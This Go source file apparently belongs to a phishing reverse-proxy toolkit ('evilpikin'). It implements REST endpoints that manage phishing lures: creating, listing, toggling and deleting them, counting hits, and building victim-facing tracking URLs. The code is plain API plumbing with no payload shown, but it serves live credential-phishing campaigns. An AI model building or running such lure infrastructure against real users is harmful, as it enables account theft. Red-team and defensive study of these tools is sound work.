// Lures REST control plane. Wires the live lures.Registry (shared with the
// data plane and the TUI) into the management API so ARK — and any other
// HTTP client — can list, create, toggle and delete lures against one
// source of truth. Every mutation is applied to the in-memory registry AND
// mirrored to SQLite by the registry itself, so changes are enforced on the
// next victim request without a restart.
package control

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/user/evilpikin/internal/log"
	"github.com/user/evilpikin/pkg/config"
	"github.com/user/evilpikin/pkg/lures"
	pxr "github.com/user/evilpikin/pkg/proxy"
)

type lureJSON struct {
	ID            string `json:"id"`
	Path          string `json:"path"`
	Target        string `json:"target"`
	TargetProfile string `json:"target_profile"`
	Redirect      string `json:"redirect,omitempty"`
	Landing       string `json:"landing,omitempty"`
	Hits          int64  `json:"hits"`
	IsActive      bool   `json:"is_active"`
	CreatedAt     string `json:"created_at"`
	TrackingURL   string `json:"tracking_url"`
}

// SetLures attaches the shared lures registry + runtime attribution index to
// the control plane and registers /api/v1/lures. httpsAddr is used to build
// victim-facing tracking URLs (it carries the dev TLS port, e.g. :9443).
func (c *ControlAPI) SetLures(registry *lures.Registry, runtime *pxr.RuntimeRegistry, httpsAddr string) {
	h := &luresHandler{c: c, registry: registry, runtime: runtime, httpsAddr: httpsAddr}
	c.inner.HandleFunc("/api/v1/lures", h.list).Methods("GET")
	c.inner.HandleFunc("/api/v1/lures", h.create).Methods("POST")
	c.inner.HandleFunc("/api/v1/lures/{id}", h.delete).Methods("DELETE")
	c.inner.HandleFunc("/api/v1/lures/{id}/active", h.setActive).Methods("POST")
}

type luresHandler struct {
	c         *ControlAPI
	registry  *lures.Registry
	runtime   *pxr.RuntimeRegistry
	httpsAddr string
}

func writeJSON(w http.ResponseWriter, status int, v interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

func (h *luresHandler) hits(id string) int64 {
	if h.runtime == nil {
		return 0
	}
	if inst, ok := h.runtime.GetLureByToken(id); ok {
		return inst.Hits
	}
	return 0
}

func (h *luresHandler) trackingURL(l *lures.Lure) string {
	host := l.TargetProfile
	if _, port, err := net.SplitHostPort(h.httpsAddr); err == nil && port != "" && port != "443" {
		host = net.JoinHostPort(host, port)
	}
	return l.TrackingURL(host, "")
}

func (h *luresHandler) present(l *lures.Lure) lureJSON {
	return lureJSON{
		ID:            l.ID,
		Path:          l.Path,
		Target:        l.TargetProfile,
		TargetProfile: l.TargetProfile,
		Redirect:      l.RedirectURL,
		Landing:       l.LandingPath,
		Hits:          h.hits(l.ID),
		IsActive:      l.IsActive,
		CreatedAt:     l.CreatedAt.UTC().Format(time.RFC3339),
		TrackingURL:   h.trackingURL(l),
	}
}

func (h *luresHandler) list(w http.ResponseWriter, r *http.Request) {
	ls := h.registry.List()
	out := make([]lureJSON, 0, len(ls))
	for _, l := range ls {
		out = append(out, h.present(l))
	}
	writeJSON(w, http.StatusOK, map[string]interface{}{"count": len(out), "lures": out})
}

type createLureRequest struct {
	Path     string `json:"path"`
	Target   string `json:"target"` // target profile ID (mirrors `lure create --target <id>`)
	Redirect string `json:"redirect"`
	Landing  string `json:"landing"`
}

func (h *luresHandler) create(w http.ResponseWriter, r *http.Request) {
	var req createLureRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid JSON body"})
		return
	}
	path := strings.Trim(strings.TrimSpace(req.Path), "/")
	if path == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "path is required"})
		return
	}
	if req.Target == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "target is required"})
		return
	}
	t, err := h.c.store.GetTarget(req.Target)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": fmt.Sprintf("target %q not found", req.Target)})
		return
	}
	l, err := h.registry.Create(path, t.ProxyHost, req.Redirect)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}
	// registry.Create has no landing-path argument; set it on the shared
	// pointer and mirror to SQLite so it survives restarts.
	if landing := strings.TrimSpace(req.Landing); landing != "" {
		l.LandingPath = landing
		if err := h.c.store.SaveLure(l); err != nil {
			log.Error("lures: persist landing_path for lure %s: %v", l.ID, err)
		}
	}
	if h.runtime != nil {
		h.runtime.RegisterLure(&config.LureInstance{
			Token:       l.ID,
			TargetID:    t.ProxyHost,
			RedirectURL: req.Redirect,
			IsActive:    true,
		})
	}
	writeJSON(w, http.StatusCreated, h.present(l))
}

func (h *luresHandler) delete(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	if !h.registry.Delete(id) {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": fmt.Sprintf("lure %q not found", id)})
		return
	}
	if h.runtime != nil {
		h.runtime.UnregisterLure(id)
	}
	w.WriteHeader(http.StatusNoContent)
}

func (h *luresHandler) setActive(w http.ResponseWriter, r *http.Request) {
	id := mux.Vars(r)["id"]
	var req struct {
		Active *bool `json:"active"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Active == nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "body must be {\"active\": true|false}"})
		return
	}
	if !h.registry.SetActive(id, *req.Active) {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": fmt.Sprintf("lure %q not found", id)})
		return
	}
	if l, ok := h.registry.Get(id); ok && h.runtime != nil {
		if *req.Active {
			h.runtime.RegisterLure(&config.LureInstance{Token: l.ID, TargetID: l.TargetProfile, RedirectURL: l.RedirectURL, IsActive: true})
		} else {
			h.runtime.UnregisterLure(l.ID)
		}
	}
	if l, ok := h.registry.Get(id); ok {
		writeJSON(w, http.StatusOK, h.present(l))
		return
	}
	writeJSON(w, http.StatusOK, map[string]string{"status": "ok"})
}
